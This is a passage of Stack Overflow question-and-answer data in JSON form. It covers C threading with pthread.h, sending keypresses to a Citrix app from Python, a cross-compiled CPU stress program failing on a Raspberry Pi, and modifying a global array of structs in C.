<code>pthread.h</code>?"}, {"owner": {"reputation": 15260, "user_id": 1968182, "user_type": "registered", "accept_rate": 0, "profile_image": "https://i.stack.imgur.com/E5nF2.jpg?s=128&g=1", "display_name": "Ulrich Eckhardt", "link": "https://stackoverflow.com/users/1968182/ulrich-eckhardt"}, "edited": false, "score": 1, "creation_date": 1524684289, "post_id": 50029817, "comment_id": 87075961, "body": "Check whether the book gives some background info about that threading library. Further, check how old that book is. It could be that it uses some ancient or obsolete libraries. BTW: Which book? That would be a valuable info to add to your question."}, {"owner": {"reputation": 2729, "user_id": 6486187, "user_type": "registered", "profile_image": "https://graph.facebook.com/722616891201339/picture?type=large", "display_name": "Abhishek Keshri", "link": "https://stackoverflow.com/users/6486187/abhishek-keshri"}, "edited": false, "score": 0, "creation_date": 1524684472, "post_id": 50029817, "comment_id": 87076050, "body": "yeah please mention the source, never heard of <code>sthread.h</code>"}, {"owner": {"reputation": 45, "user_id": 9699773, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/30d6076c2e634783630bfba45a1a16f0?s=128&d=identicon&r=PG&f=1", "display_name": "Little Max", "link": "https://stackoverflow.com/users/9699773/little-max"}, "edited": false, "score": 0, "creation_date": 1524686308, "post_id": 50029817, "comment_id": 87076827, "body": "Maybe pthread.h , I don&#39;t know because I saw this code in the book.And I can&#39;t figure out with that"}], "answers": [{"comments": [{"owner": {"reputation": 45534, "user_id": 106104, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/c88b9310b92a937108ec4336c2832f92?s=128&d=identicon&r=PG", "display_name": "user253751", "link": "https://stackoverflow.com/users/106104/user253751"}, "reply_to_user": {"reputation": 45, "user_id": 9699773, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/30d6076c2e634783630bfba45a1a16f0?s=128&d=identicon&r=PG&f=1", "display_name": "Little Max", "link": "https://stackoverflow.com/users/9699773/little-max"}, "edited": false, "score": 0, "creation_date": 1524734302, "post_id": 50033830, "comment_id": 87094494, "body": "@LittleMax Did you try Googling something like: c threads windows?"}, {"owner": {"reputation": 45, "user_id": 9699773, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/30d6076c2e634783630bfba45a1a16f0?s=128&d=identicon&r=PG&f=1", "display_name": "Little Max", "link": "https://stackoverflow.com/users/9699773/little-max"}, "edited": false, "score": 0, "creation_date": 1524737208, "post_id": 50033830, "comment_id": 87096473, "body": "Yes, but I didn&#39;t find answer.Can you send me link with answer, please?:)"}, {"owner": {"reputation": 15260, "user_id": 1968182, "user_type": "registered", "accept_rate": 0, "profile_image": "https://i.stack.imgur.com/E5nF2.jpg?s=128&g=1", "display_name": "Ulrich Eckhardt", "link": "https://stackoverflow.com/users/1968182/ulrich-eckhardt"}, "edited": false, "score": 0, "creation_date": 1524767239, "post_id": 50033830, "comment_id": 87115610, "body": "There are implementations of the POSIX thread API for use under MS Windows."}], "tags": [], "owner": {"reputation": 45534, "user_id": 106104, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/c88b9310b92a937108ec4336c2832f92?s=128&d=identicon&r=PG", "display_name": "user253751", "link": "https://stackoverflow.com/users/106104/user253751"}, "is_accepted": false, "score": 0, "last_activity_date": 1524708908, "creation_date": 1524708908, "answer_id": 50033830, "question_id": 50029817, "link": "https://stackoverflow.com/questions/50029817/how-include-sthread-h-in-c/50033830#50033830", "title": "How include &quot;sthread.h&quot; in C", "body": "<blockquote>\n  <p>And I can't use header pthread.h. Where I can take code for this header or where I can find something about it?</p>\n</blockquote>\n\n<p>It's part of your operating system. If you don't have it, you can't.</p>\n\n<blockquote>\n  <p>Also do I need special additionals when I compile it on Windows.</p>\n</blockquote>\n\n<p>Yes, you need to know that Windows doesn't have pthreads.</p>\n"}], "owner": {"reputation": 45, "user_id": 9699773, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/30d6076c2e634783630bfba45a1a16f0?s=128&d=identicon&r=PG&f=1", "display_name": "Little Max", "link": "https://stackoverflow.com/users/9699773/little-max"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 99, "favorite_count": 0, "answer_count": 1, "score": -1, "last_activity_date": 1524708908, "creation_date": 1524683777, "last_edit_date": 1524686622, "question_id": 50029817, "link": "https://stackoverflow.com/questions/50029817/how-include-sthread-h-in-c", "title": "How include &quot;sthread.h&quot; in C", "body": "<p>I am reading some book(Operating Systems Principles and Practice 2012) and I have example with C code with threads.`\nAnd I can't use header pthread.h. Where I can take code for this header or where I can find something about it?Also do I need special additionals when I compile it on Windows.Thanks every one:)</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;pthread.h&gt;\n\nstatic void go(int n);\n\n#define NTHREADS 10\nstatic pthread_t threads[NTHREADS];\n\nint main(int argc, char **argv)\n{\n    int ii;\n\n    for(ii = 0; ii &lt; NTHREADS; ii++)\n    {\n        pthread_create(&amp;(threads[ii]), &amp;go, ii);\n    }\n\n    for(ii = 0; ii &lt; NTHREADS; ii++)\n    {\n        long ret = pthread_join(threads[ii]);\n        printf(\"Thread %d returned %ld\\n\", ii, ret);\n    }\n\n    printf(\"Main thread done.\\n\");\n    return 0;\n}\n\nvoid go(int n)\n{\n    printf(\"Hello from thread %d\\n\", n);\n    pthread_exit(100 + n);\n}\n</code></pre>\n"}, {"tags": ["python", "c", "vb.net", "keyboard", "citrix"], "answers": [{"tags": [], "owner": {"reputation": 961, "user_id": 8054843, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/5509c35e6566c57c5ec9fe5e7d559181?s=128&d=identicon&r=PG&f=1", "display_name": "ipenguin67", "link": "https://stackoverflow.com/users/8054843/ipenguin67"}, "is_accepted": true, "score": 0, "last_activity_date": 1524862612, "last_edit_date": 1524862612, "creation_date": 1524859883, "answer_id": 50069648, "question_id": 50029691, "link": "https://stackoverflow.com/questions/50029691/imitate-hardware-keypress-in-python-script-when-sending-to-citrix-app-sendkeys/50069648#50069648", "title": "Imitate hardware keypress in Python script when sending to Citrix app (SendKeys does not work)", "body": "<p>I finally found something that worked: <a href=\"https://pypi.org/project/keyboard/\" rel=\"nofollow noreferrer\">Keyboard</a></p>\n\n<p>This successfully sent keystrokes, including modifiers, to a Citrix application. To send <kbd>CTRL</kbd>-<kbd>SPACE</kbd> as described above is as easy as Keyboard.send('ctrl-space'). Hope this helps someone!</p>\n"}], "owner": {"reputation": 961, "user_id": 8054843, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/5509c35e6566c57c5ec9fe5e7d559181?s=128&d=identicon&r=PG&f=1", "display_name": "ipenguin67", "link": "https://stackoverflow.com/users/8054843/ipenguin67"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 734, "favorite_count": 0, "accepted_answer_id": 50069648, "answer_count": 1, "score": -1, "last_activity_date": 1524862612, "creation_date": 1524683244, "last_edit_date": 1524693983, "question_id": 50029691, "link": "https://stackoverflow.com/questions/50029691/imitate-hardware-keypress-in-python-script-when-sending-to-citrix-app-sendkeys", "title": "Imitate hardware keypress in Python script when sending to Citrix app (SendKeys does not work)", "body": "<p>I've spent much of the last two days trying to figure out how to send a Ctrl-Space to an app running on Citrix. My script is Python-based, and I have tried various solutions from SendKeys through Pywin32 and SendInput(), as well as solutions outlined in these posts among others I have long since closed:\n<a href=\"https://stackoverflow.com/questions/13564851/how-to-generate-keyboard-events-in-python\">Generate Keyboard events in python</a>\n<a href=\"https://stackoverflow.com/questions/18647053/sendinput-not-equal-to-pressing-key-manually-on-keyboard-in-c\">SendInput</a></p>\n\n<p>The issue is these all seem to be sending text or simulated keypresses, which Citrix is not recognizing. What it seems like I need to do is emulate the hardware keypress rather than sending directly to the app. Many of the solutions are in C (or similar), with which I am unacquainted. </p>\n\n<p>Does anyone have a Python-based solution for this? Or a way to include C or VB.NET code in Python? There was a VB solution listed <a href=\"https://www.codeproject.com/Tips/310817/SendKeys-using-ScanCodes-to-Citrix\" rel=\"nofollow noreferrer\">here</a> that may or may not work, but I'm not sure how to import its functionality into my Python-based script.</p>\n\n<p>Any suggestions are appreciated!</p>\n\n<p>EDIT: To underscore the need for direct hardware manipulation rather than simulated keypresses, I sent the following commands to the Citrix app:</p>\n\n<pre><code>        SendInput(Keyboard(VK_RETURN))\n        SendInput(Keyboard(VK_RETURN, KEYEVENTF_KEYUP))\n        SendInput(Keyboard(VK_CAPITAL))\n        SendInput(Keyboard(KEY_L))\n        SendInput(Keyboard(KEY_L, KEYEVENTF_KEYUP))\n        SendInput(Keyboard(VK_CAPITAL, KEYEVENTF_KEYUP))\n        SendInput(Keyboard(KEY_0))\n        SendInput(Keyboard(KEY_0, KEYEVENTF_KEYUP))\n        SendInput(Keyboard(VK_SPACE))\n        SendInput(Keyboard(VK_SPACE, KEYEVENTF_KEYUP))\n        SendInput(Keyboard(KEY_A))\n        SendInput(Keyboard(KEY_A, KEYEVENTF_KEYUP))\n        SendInput(Keyboard(VK_BACK))\n        SendInput(Keyboard(VK_BACK, KEYEVENTF_KEYUP))\n        SendInput(Keyboard(VK_CONTROL))\n        SendInput(Keyboard(KEY_A))\n        SendInput(Keyboard(KEY_A, KEYEVENTF_KEYUP))\n        SendInput(Keyboard(VK_CONTROL, KEYEVENTF_KEYUP))\n        SendInput(Keyboard(VK_LCONTROL))\n        SendInput(Keyboard(KEY_V))\n        SendInput(Keyboard(KEY_V, KEYEVENTF_KEYUP))\n        SendInput(Keyboard(VK_CONTROL, KEYEVENTF_KEYUP))\n        SendInput(Keyboard(VK_RETURN))\n        SendInput(Keyboard(VK_RETURN, KEYEVENTF_KEYUP))\n</code></pre>\n\n<p>And I got the following output in the app: =tbd7w\\=</p>\n"}, {"tags": ["c", "cross-compiling", "raspberry-pi3", "archlinux", "archlinux-arm"], "comments": [{"owner": {"reputation": 15409, "user_id": 2877364, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/0a101160e41fd7fd75f5fc701f8acb1c?s=128&d=identicon&r=PG", "display_name": "cxw", "link": "https://stackoverflow.com/users/2877364/cxw"}, "edited": false, "score": 1, "creation_date": 1524682174, "post_id": 50029330, "comment_id": 87074854, "body": "Can you get it down to an MCVE?"}, {"owner": {"reputation": 10095, "user_id": 1158977, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/B6Za7.png?s=128&g=1", "display_name": "Sam Hammamy", "link": "https://stackoverflow.com/users/1158977/sam-hammamy"}, "reply_to_user": {"reputation": 15409, "user_id": 2877364, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/0a101160e41fd7fd75f5fc701f8acb1c?s=128&d=identicon&r=PG", "display_name": "cxw", "link": "https://stackoverflow.com/users/2877364/cxw"}, "edited": false, "score": 0, "creation_date": 1524682285, "post_id": 50029330, "comment_id": 87074914, "body": "Sure, trying so now"}], "answers": [{"comments": [{"owner": {"reputation": 114796, "user_id": 214671, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/f82954c7134fbe63282dc033fd52f3ab?s=128&d=identicon&r=PG", "display_name": "Matteo Italia", "link": "https://stackoverflow.com/users/214671/matteo-italia"}, "edited": false, "score": 1, "creation_date": 1525518783, "post_id": 50188592, "comment_id": 87394325, "body": "&quot;I would have thought that <code>forks</code> should have been initialized to 0 by the compiler as past of the <code>bss_data</code> so I am not sure why it didn&#39;t&quot; <code>forks</code> is a local variable, if you leave it uninitialized it will get whatever happens to be on the stack/register in its place; more in abstract, the C standard says that it&#39;s undefined behavior to read from an uninitialized variable. <code>.bss</code> is for globals (more precisely: for static storage duration variables, i.e. globals + <code>static</code> locals, which are globals in disguise), which are guaranteed to be 0 if not explicitly initialized."}, {"owner": {"reputation": 114796, "user_id": 214671, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/f82954c7134fbe63282dc033fd52f3ab?s=128&d=identicon&r=PG", "display_name": "Matteo Italia", "link": "https://stackoverflow.com/users/214671/matteo-italia"}, "edited": false, "score": 1, "creation_date": 1525519024, "post_id": 50188592, "comment_id": 87394386, "body": "By the way, this would have been spotted immediately when compiling with <code>-Wall -Wextra -O3</code>. You should get in the habit of always compiling with most warnings enabled to avoid these traps."}, {"owner": {"reputation": 10095, "user_id": 1158977, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/B6Za7.png?s=128&g=1", "display_name": "Sam Hammamy", "link": "https://stackoverflow.com/users/1158977/sam-hammamy"}, "reply_to_user": {"reputation": 114796, "user_id": 214671, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/f82954c7134fbe63282dc033fd52f3ab?s=128&d=identicon&r=PG", "display_name": "Matteo Italia", "link": "https://stackoverflow.com/users/214671/matteo-italia"}, "edited": false, "score": 1, "creation_date": 1525519515, "post_id": 50188592, "comment_id": 87394539, "body": "Nice! Thanks for the tip!"}, {"owner": {"reputation": 114796, "user_id": 214671, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/f82954c7134fbe63282dc033fd52f3ab?s=128&d=identicon&r=PG", "display_name": "Matteo Italia", "link": "https://stackoverflow.com/users/214671/matteo-italia"}, "edited": false, "score": 0, "creation_date": 1525524318, "post_id": 50188592, "comment_id": 87395968, "body": "<a href=\"https://godbolt.org/g/8SpbWH\" rel=\"nofollow noreferrer\">godbolt.org/g/8SpbWH</a> for example. BTW in your original code <code>do_io</code>, <code>do_vm</code> and <code>do_hdd</code> are missing."}], "tags": [], "owner": {"reputation": 10095, "user_id": 1158977, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/B6Za7.png?s=128&g=1", "display_name": "Sam Hammamy", "link": "https://stackoverflow.com/users/1158977/sam-hammamy"}, "is_accepted": true, "score": 1, "last_activity_date": 1525517229, "creation_date": 1525517229, "answer_id": 50188592, "question_id": 50029330, "link": "https://stackoverflow.com/questions/50029330/cross-compiling-for-arch-arm-does-not-produce-a-functional-executable/50188592#50188592", "title": "Cross Compiling For Arch Arm Does Not Produce A Functional Executable", "body": "<p>The issue here was how the <code>long forks;</code> variable was initialized. I am not well versed in compilers, but because <code>forks</code> was not initialized, the calculation <code>backoff = do_backoff * forks;</code> resulted in a random negative number.</p>\n\n<p>This blocked the call <code>usleep (backoff);</code> from finishing.  So initializing <code>forks</code> to 1 fixed the problem.</p>\n\n<p>I would have thought that <code>forks</code> should have been initialized to <code>0</code> by the compiler as past of the <code>bss_data</code> so I am not sure why it didn't.  Probably need more research into that part, but the code executes fine now with cross compiling. </p>\n"}], "owner": {"reputation": 10095, "user_id": 1158977, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/B6Za7.png?s=128&g=1", "display_name": "Sam Hammamy", "link": "https://stackoverflow.com/users/1158977/sam-hammamy"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 65, "favorite_count": 0, "accepted_answer_id": 50188592, "answer_count": 1, "score": 1, "last_activity_date": 1525517229, "creation_date": 1524681883, "last_edit_date": 1524682975, "question_id": 50029330, "link": "https://stackoverflow.com/questions/50029330/cross-compiling-for-arch-arm-does-not-produce-a-functional-executable", "title": "Cross Compiling For Arch Arm Does Not Produce A Functional Executable", "body": "<p>I installed <a href=\"https://archlinuxarm.org/platforms/armv7/broadcom/raspberry-pi-2\" rel=\"nofollow noreferrer\">Arch Arm</a> onto an Rpi3, then rsync'd sysroot to an x86_64 Arch Linux installed on a Lenovo thinkpad.</p>\n\n<p>I then installed the <a href=\"https://releases.linaro.org/components/toolchain/binaries/latest/arm-linux-gnueabihf/gcc-linaro-7.2.1-2017.11-i686_arm-linux-gnueabihf.tar.xz\" rel=\"nofollow noreferrer\">arm-linux-gnueabihf</a> Linaro cross compiler</p>\n\n<p>To avoid any problems I used absolute paths in compilation:</p>\n\n<pre><code>/home/sameh/Rpi/Compiler/gcc-linaro-7.2.1-2017.11-x86_64_arm-linux-gnueabihf/bin/arm-linux-gnueabihf-gcc\\\n --sysroot=/home/sameh/Rpi/Arch/ArmV7/root\\\n -o stress stress.c -lm\n</code></pre>\n\n<p>The code compiles fine, however when I execute it on the Rpi3 it has no output.</p>\n\n<p>It doesn't freez the Pi, I can <code>ps aux</code> and see the child processes created by <code>fork()</code>.</p>\n\n<p>But none of the debug statements are printed and none of the processes exit.</p>\n\n<p><strong>Edit</strong></p>\n\n<p>This code is based on the <a href=\"https://people.seas.harvard.edu/~apw/stress/\" rel=\"nofollow noreferrer\">stress</a> library.  For an MCVE I minimized it to only the <code>hogcpu</code> function</p>\n\n<pre><code>#include &lt;ctype.h&gt;\n#include &lt;errno.h&gt;\n#include &lt;libgen.h&gt;\n#include &lt;math.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;signal.h&gt;\n#include &lt;time.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;sys/wait.h&gt;\n\nint hogcpu (void);\n\nint\nhogcpu (void)\n{\n  for(int i=0; i &lt; 1000000; i++)\n    sqrt (rand ());\n  return 0;\n}\n\nint main()\n{\n\n  struct timespec start, end;\n  double cpu_time_used;\n  int pid, children = 0, retval = 0;\n  long forks;\n  int do_dryrun = 0;\n  long long do_backoff = 3000;\n\n  long long do_cpu = 1;\n  long long backoff, timeout = 0;\n\n  /* Calculate the backoff value so we get good fork throughput.  */\n  backoff = do_backoff * forks;\n\n  clock_gettime(CLOCK_REALTIME, &amp;start); \n\n  while ((forks = (do_cpu + do_io + do_vm + do_hdd)))\n  {\n    if (do_cpu)\n    {\n      switch (pid = fork ())\n        {\n        case 0:            /* child */\n          alarm (timeout);\n          usleep (backoff);\n          exit (hogcpu ());\n        case -1:           /* error */\n          break;\n        default:\n          ++children;\n        }\n      --do_cpu;\n    }\n\n  }\n  /* Wait for our children to exit.  */\n  while (children)\n  {\n    int status, ret;\n\n    if ((pid = wait (&amp;status)) &gt; 0)\n    {\n      --children;\n      if (WIFEXITED (status))\n      {\n        if ((ret = WEXITSTATUS (status)) == 0)\n        {\n          printf( \"&lt;-- worker %i returned normally\\n\", pid);\n        }\n        else\n        {\n          printf( \"&lt;-- worker %i returned error %i\\n\", pid, ret);\n          ++retval;\n          printf( \"now reaping child worker processes\\n\");\n          if (signal (SIGUSR1, SIG_IGN) == SIG_ERR)\n            printf( \"handler error: %s\\n\", strerror (errno));\n          if (kill (-1 * getpid (), SIGUSR1) == -1)\n            printf( \"kill error: %s\\n\", strerror (errno));\n        }\n      }\n    }\n  }\n\n  clock_gettime(CLOCK_REALTIME, &amp;end); \n  cpu_time_used = (end.tv_nsec = start.tv_nsec) / 1000000000.0;\n  /* Print final status message.  */\n  if (retval)\n  {\n    printf( \"failed run completed in %.2f s\\n\", cpu_time_used);\n  }\n  else\n  {\n    printf( \"successful run completed in -- %.2f s\\n\", cpu_time_used);\n  }\n\n  exit (retval);\n}\n</code></pre>\n\n<p>I can successfully compile and execute it on the the Pi with:</p>\n\n<pre><code>[alarm@control ~]$ gcc stress.c -o stress -lm\n[alarm@control ~]$ ./stress \n&lt;-- worker 16834 returned normally\n&lt;-- worker 16835 returned normally\n&lt;-- worker 16836 returned normally\nsuccessful run completed in -- 0.90 s\n</code></pre>\n\n<p>However, when cross compiled and transferred to the Pi, the behavior described above is what I am seeing.</p>\n\n<p><strong><em>Note</em></strong></p>\n\n<p>This may well have to do with the <code>clock_gettime</code> call.  When I replace this with a <code>clock()</code> function call, I can compile and run it on the laptop, but compiling on the Pi with <code>gcc</code> has the same behavior above.</p>\n\n<p>When using <code>clock_gettime</code> and compiling on the Pi, it works fine.</p>\n"}, {"tags": ["c", "function"], "comments": [{"owner": {"reputation": 109, "user_id": 7840726, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/1767702923a856604b37ed93e1242d7a?s=128&d=identicon&r=PG&f=1", "display_name": "L2C", "link": "https://stackoverflow.com/users/7840726/l2c"}, "edited": false, "score": 0, "creation_date": 1524681826, "post_id": 50029265, "comment_id": 87074682, "body": "I have remove some of the code that isn&#39;t necessary for this question, that&#39;s why it seem status isn&#39;t used."}, {"owner": {"reputation": 9846, "user_id": 1745544, "user_type": "registered", "accept_rate": 23, "profile_image": "https://www.gravatar.com/avatar/92a0f69d86d214e0cffceb76c6e3f09f?s=128&d=identicon&r=PG", "display_name": "OldProgrammer", "link": "https://stackoverflow.com/users/1745544/oldprogrammer"}, "edited": false, "score": 3, "creation_date": 1524681885, "post_id": 50029265, "comment_id": 87074711, "body": "Please post a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>."}, {"owner": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "edited": false, "score": 1, "creation_date": 1524681901, "post_id": 50029265, "comment_id": 87074715, "body": "<code>input</code> is locale... what is <code>information</code> ?"}, {"owner": {"reputation": 74843, "user_id": 2988730, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/ZOX7t.jpg?s=128&g=1", "display_name": "Mad Physicist", "link": "https://stackoverflow.com/users/2988730/mad-physicist"}, "edited": false, "score": 3, "creation_date": 1524681938, "post_id": 50029265, "comment_id": 87074739, "body": "You&#39;re using globals and forgetting to mention it."}, {"owner": {"reputation": 109, "user_id": 7840726, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/1767702923a856604b37ed93e1242d7a?s=128&d=identicon&r=PG&f=1", "display_name": "L2C", "link": "https://stackoverflow.com/users/7840726/l2c"}, "reply_to_user": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "edited": false, "score": 0, "creation_date": 1524681968, "post_id": 50029265, "comment_id": 87074747, "body": "@Stargateur ah yes I forgot to mention that information is an array of structs, I will edit the question now"}, {"owner": {"reputation": 109, "user_id": 7840726, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/1767702923a856604b37ed93e1242d7a?s=128&d=identicon&r=PG&f=1", "display_name": "L2C", "link": "https://stackoverflow.com/users/7840726/l2c"}, "reply_to_user": {"reputation": 74843, "user_id": 2988730, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/ZOX7t.jpg?s=128&g=1", "display_name": "Mad Physicist", "link": "https://stackoverflow.com/users/2988730/mad-physicist"}, "edited": false, "score": 0, "creation_date": 1524682062, "post_id": 50029265, "comment_id": 87074805, "body": "@MadPhysicist I&#39;ll edit it now"}, {"owner": {"reputation": 109, "user_id": 7840726, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/1767702923a856604b37ed93e1242d7a?s=128&d=identicon&r=PG&f=1", "display_name": "L2C", "link": "https://stackoverflow.com/users/7840726/l2c"}, "reply_to_user": {"reputation": 9846, "user_id": 1745544, "user_type": "registered", "accept_rate": 23, "profile_image": "https://www.gravatar.com/avatar/92a0f69d86d214e0cffceb76c6e3f09f?s=128&d=identicon&r=PG", "display_name": "OldProgrammer", "link": "https://stackoverflow.com/users/1745544/oldprogrammer"}, "edited": false, "score": 0, "creation_date": 1524682148, "post_id": 50029265, "comment_id": 87074838, "body": "@OldProgrammer what needs to change? I have added a few updates but what else?"}, {"owner": {"reputation": 9846, "user_id": 1745544, "user_type": "registered", "accept_rate": 23, "profile_image": "https://www.gravatar.com/avatar/92a0f69d86d214e0cffceb76c6e3f09f?s=128&d=identicon&r=PG", "display_name": "OldProgrammer", "link": "https://stackoverflow.com/users/1745544/oldprogrammer"}, "edited": false, "score": 1, "creation_date": 1524682297, "post_id": 50029265, "comment_id": 87074924, "body": "&quot;information is a global array of struct &quot; - then show the declaration.  People here are not mind readers."}, {"owner": {"reputation": 3954, "user_id": 3137388, "user_type": "registered", "accept_rate": 99, "profile_image": "https://www.gravatar.com/avatar/98f780bca09821cbd63d84b8d6e028df?s=128&d=identicon&r=PG&f=1", "display_name": "kadina", "link": "https://stackoverflow.com/users/3137388/kadina"}, "edited": false, "score": 1, "creation_date": 1524682298, "post_id": 50029265, "comment_id": 87074925, "body": "What you tried to print? How you called the function? How you declared information? Without posting the minimal example, how it is possible to analyze your problem?"}, {"owner": {"reputation": 58995, "user_id": 1322972, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/puZFr.png?s=128&g=1", "display_name": "WhozCraig", "link": "https://stackoverflow.com/users/1322972/whozcraig"}, "edited": false, "score": 0, "creation_date": 1524682356, "post_id": 50029265, "comment_id": 87074944, "body": "<i>&quot;information is an array of structs&quot;</i> - not possible. Native arrays cannot be the target of assignment. At best it is a pointer to a dynamic sequence of <code>struct some_struct</code>."}, {"owner": {"reputation": 109, "user_id": 7840726, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/1767702923a856604b37ed93e1242d7a?s=128&d=identicon&r=PG&f=1", "display_name": "L2C", "link": "https://stackoverflow.com/users/7840726/l2c"}, "edited": false, "score": 0, "creation_date": 1524682439, "post_id": 50029265, "comment_id": 87074987, "body": "Think people are more focused on fixing the question rather than answering the question. It&#39;s a generic question. Am I supposed to pass the array of struct into the function to change it or is it fine to append like this"}, {"owner": {"reputation": 58995, "user_id": 1322972, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/puZFr.png?s=128&g=1", "display_name": "WhozCraig", "link": "https://stackoverflow.com/users/1322972/whozcraig"}, "edited": false, "score": 0, "creation_date": 1524682567, "post_id": 50029265, "comment_id": 87075060, "body": "If the function expands the dynamic sequence, it needs the original pointer and the new size. How you get that back to the caller-side is up to you (pointer-to-pointer out parameter, function return result, or (please don&#39;t do this) a global, are all options). you&#39;l need to update the size anyway, so I&#39;d use the first (everything passed as in/out arguments) and use the return value as error-status."}, {"owner": {"reputation": 3954, "user_id": 3137388, "user_type": "registered", "accept_rate": 99, "profile_image": "https://www.gravatar.com/avatar/98f780bca09821cbd63d84b8d6e028df?s=128&d=identicon&r=PG&f=1", "display_name": "kadina", "link": "https://stackoverflow.com/users/3137388/kadina"}, "edited": false, "score": 0, "creation_date": 1524682670, "post_id": 50029265, "comment_id": 87075118, "body": "@L2C: what is your problem in posting the complete code? How one can answer your question when you haven&#39;t given complete information about your problem. Did you post what you tried to print? How you declared information? Technology is not so much advanced that one can see code in your laptop and understand your problem."}, {"owner": {"reputation": 109, "user_id": 7840726, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/1767702923a856604b37ed93e1242d7a?s=128&d=identicon&r=PG&f=1", "display_name": "L2C", "link": "https://stackoverflow.com/users/7840726/l2c"}, "reply_to_user": {"reputation": 3954, "user_id": 3137388, "user_type": "registered", "accept_rate": 99, "profile_image": "https://www.gravatar.com/avatar/98f780bca09821cbd63d84b8d6e028df?s=128&d=identicon&r=PG&f=1", "display_name": "kadina", "link": "https://stackoverflow.com/users/3137388/kadina"}, "edited": false, "score": 1, "creation_date": 1524682787, "post_id": 50029265, "comment_id": 87075184, "body": "@kadina not so much the problem of posting the code. I want to be able to apply it to all situations. Is that a problem? Or should I post the code and ask you to change it, only for you to reply this isn&#39;t a code writing service."}, {"owner": {"reputation": 3954, "user_id": 3137388, "user_type": "registered", "accept_rate": 99, "profile_image": "https://www.gravatar.com/avatar/98f780bca09821cbd63d84b8d6e028df?s=128&d=identicon&r=PG&f=1", "display_name": "kadina", "link": "https://stackoverflow.com/users/3137388/kadina"}, "edited": false, "score": 0, "creation_date": 1524683114, "post_id": 50029265, "comment_id": 87075389, "body": "@L2C: Don&#39;t think everyone is same. Some will say that it is not code wiring service. Not every one."}], "answers": [{"comments": [{"owner": {"reputation": 109, "user_id": 7840726, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/1767702923a856604b37ed93e1242d7a?s=128&d=identicon&r=PG&f=1", "display_name": "L2C", "link": "https://stackoverflow.com/users/7840726/l2c"}, "edited": false, "score": 0, "creation_date": 1524682889, "post_id": 50029551, "comment_id": 87075242, "body": "So as long as the array of struct is declared global I can make any modifications (add/delete/update) to it and it is permanent is what you&#39;re saying?"}], "tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": true, "score": 1, "last_activity_date": 1524682687, "creation_date": 1524682687, "answer_id": 50029551, "question_id": 50029265, "link": "https://stackoverflow.com/questions/50029265/c-appending-to-array-of-struct/50029551#50029551", "title": "C appending to array of struct", "body": "<p>The variable <code>information</code> isn't declared inside of the function but you are able to access it.  That means it's declared as a global variable and is accessible from anywhere inside of your source file.</p>\n\n<p>Had you declared this variable inside of a function, then you would need to pass its address into the function in order to modify it.</p>\n"}, {"tags": [], "owner": {"reputation": 3954, "user_id": 3137388, "user_type": "registered", "accept_rate": 99, "profile_image": "https://www.gravatar.com/avatar/98f780bca09821cbd63d84b8d6e028df?s=128&d=identicon&r=PG&f=1", "display_name": "kadina", "link": "https://stackoverflow.com/users/3137388/kadina"}, "is_accepted": false, "score": 1, "last_activity_date": 1524682926, "creation_date": 1524682926, "answer_id": 50029610, "question_id": 50029265, "link": "https://stackoverflow.com/questions/50029265/c-appending-to-array-of-struct/50029610#50029610", "title": "C appending to array of struct", "body": "<p>Global variable means it is available to all the functions 